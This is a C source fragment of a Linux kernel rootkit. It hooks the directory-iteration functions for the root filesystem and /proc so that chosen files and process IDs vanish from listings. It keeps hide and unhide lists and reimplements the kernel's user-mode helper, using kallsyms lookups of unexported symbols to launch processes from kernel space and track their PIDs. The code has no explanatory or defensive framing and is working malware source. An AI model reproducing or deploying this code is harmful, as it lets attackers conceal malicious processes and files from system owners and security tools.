struct hidden_proc
{
    unsigned short pid;
    struct list_head list;
};

struct hidden_file
{
    char *name;
    struct list_head list;
};

struct n_subprocess_info
{
    struct work_struct work;
    struct completion *complete;
    char *path;
    char **argv;
    char **envp;
    int wait;
    int retval;
    int (*init)(struct subprocess_info *info);
    void (*cleanup)(struct subprocess_info *info);
    void *data;
    pid_t pid;
};

LIST_HEAD(hidden_procs);
LIST_HEAD(hidden_files);

static int (*proc_filldir)(void *__buf, const char *name, int namelen, loff_t offset, u64 ino, unsigned d_type);
static int (*root_filldir)(void *__buf, const char *name, int namelen, loff_t offset, u64 ino, unsigned d_type);

static int (*proc_iterate)(struct file *file, void *dirent, filldir_t filldir);
static int (*root_iterate)(struct file *file, void *dirent, filldir_t filldir);

static int callmodule_pid;

struct n_subprocess_info *n_call_usermodehelper_setup(char *path, char **argv,
        char **envp, gfp_t gfp_mask);

static inline int n_call_usermodehelper_fns(char *path, char **argv, char **envp,
        int wait,
        int (*init)(struct subprocess_info *info),
        void (*cleanup)(struct subprocess_info *), void *data)
{
    struct subprocess_info *info;
    struct n_subprocess_info *n_info;
    gfp_t gfp_mask = (wait == UMH_NO_WAIT) ? GFP_ATOMIC : GFP_KERNEL;
    int ret;

    populate_rootfs_wait();

    n_info = n_call_usermodehelper_setup(path, argv, envp, gfp_mask);
    info = (struct subprocess_info *) n_info;

    if (info == NULL)
        return -ENOMEM;

    call_usermodehelper_setfns(info, init, cleanup, data);
    ret = call_usermodehelper_exec(info, wait);
    callmodule_pid = n_info->pid;


    return ret;
}

static inline int n_call_usermodehelper(char *path, char **argv, char **envp, int wait)
{
    return n_call_usermodehelper_fns(path, argv, envp, wait,
                                     NULL, NULL, NULL);
}


static void n__call_usermodehelper(struct work_struct *work)
{
    struct n_subprocess_info *n_sub_info =
        container_of(work, struct n_subprocess_info, work);
    int wait = n_sub_info->wait;
    pid_t pid;
    struct subprocess_info *sub_info;

    int (*ptrwait_for_helper)(void *data);
    int (*ptr____call_usermodehelper)(void *data);

    ptrwait_for_helper = (void*)kallsyms_lookup_name("wait_for_helper");
    ptr____call_usermodehelper = (void*)kallsyms_lookup_name("____call_usermodehelper");

    sub_info = (struct subprocess_info *)n_sub_info;

    if (wait == UMH_WAIT_PROC)
        pid = kernel_thread((*ptrwait_for_helper), sub_info,
                            CLONE_FS | CLONE_FILES | SIGCHLD);
    else
        pid = kernel_thread((*ptr____call_usermodehelper), sub_info,
                            CLONE_VFORK | SIGCHLD);

    callmodule_pid = pid;
    n_sub_info->pid = pid;

    switch (wait)
    {
    case UMH_NO_WAIT:
        call_usermodehelper_freeinfo(sub_info);
        break;

    case UMH_WAIT_PROC:
        if (pid > 0)
            break;
    case UMH_WAIT_EXEC:
        if (pid < 0)
            sub_info->retval = pid;
        complete(sub_info->complete);
    }
}


struct n_subprocess_info *n_call_usermodehelper_setup(char *path, char **argv,
        char **envp, gfp_t gfp_mask)
{
    struct n_subprocess_info *sub_infoB;
    sub_infoB = kzalloc(sizeof(struct n_subprocess_info), gfp_mask);
    if (!sub_infoB)
        return sub_infoB;

    INIT_WORK(&sub_infoB->work, n__call_usermodehelper);
    sub_infoB->path = path;
    sub_infoB->argv = argv;
    sub_infoB->envp = envp;

    return sub_infoB;
}



static int n_root_filldir( void *__buf, const char *name, int namelen, loff_t offset, u64 ino, unsigned d_type )
{
    struct hidden_file *hf;

    list_for_each_entry ( hf, &hidden_files, list )
    if ( ! strcmp(name, hf->name) )
        return 0;

    return root_filldir(__buf, name, namelen, offset, ino, d_type);
}

int n_root_iterate ( struct file *file, void *dirent, filldir_t filldir )
{
    int ret;

    root_filldir = filldir;
    hijack_pause(root_iterate);
    ret = root_iterate(file, dirent, n_root_filldir);
    hijack_resume(root_iterate);

    return ret;
}

static int n_proc_filldir( void *__buf, const char *name, int namelen, loff_t offset, u64 ino, unsigned d_type )
{
    struct hidden_proc *hp;
    char *endp;
    long pid;

    pid = simple_strtol(name, &endp, 10);
    list_for_each_entry ( hp, &hidden_procs, list )
    if ( pid == hp->pid )
        return 0;

    return proc_filldir(__buf, name, namelen, offset, ino, d_type);
}

int n_proc_iterate ( struct file *file, void *dirent, filldir_t filldir )
{
    int ret;

    proc_filldir = filldir;
    hijack_pause(proc_iterate);
    ret = proc_iterate(file, dirent, n_proc_filldir);
    hijack_resume(proc_iterate);

    return ret;
}

void *get_vfs_iterate ( const char *path )
{
    void *ret;
    struct file *filep;

    if ( (filep = filp_open(path, O_RDONLY, 0)) == NULL )
        return NULL;

    ret = filep->f_op->readdir;
    filp_close(filep, 0);

    return ret;
}

void hide_file ( char *name )
{
    struct hidden_file *hf;

    hf = kmalloc(sizeof(*hf), GFP_KERNEL);
    if ( ! hf )
        return;
    hf->name = name;

    list_add(&hf->list, &hidden_files);
}

void unhide_file ( char *name )
{
    struct hidden_file *hf;

    list_for_each_entry ( hf, &hidden_files, list )
    {
        if ( !strcmp(name, hf->name) )
        {
            list_del(&hf->list);
            kfree(hf->name);
            kfree(hf);
            break;
        }
    }
}

void hide_proc ( unsigned short pid )
{
    struct hidden_proc *hp;

    hp = kmalloc(sizeof(*hp), GFP_KERNEL);
    if ( ! hp )
        return;
    hp->pid = pid;

    list_add(&hp->list, &hidden_procs);
}

void unhide_proc ( unsigned short pid )
{
    struct hidden_proc *hp;

    list_for_each_entry ( hp, &hidden_procs, list )
    {
        if ( pid == hp->pid )
        {
            list_del(&hp->list);
            kfree(hp);
            break;
        }
    }
}
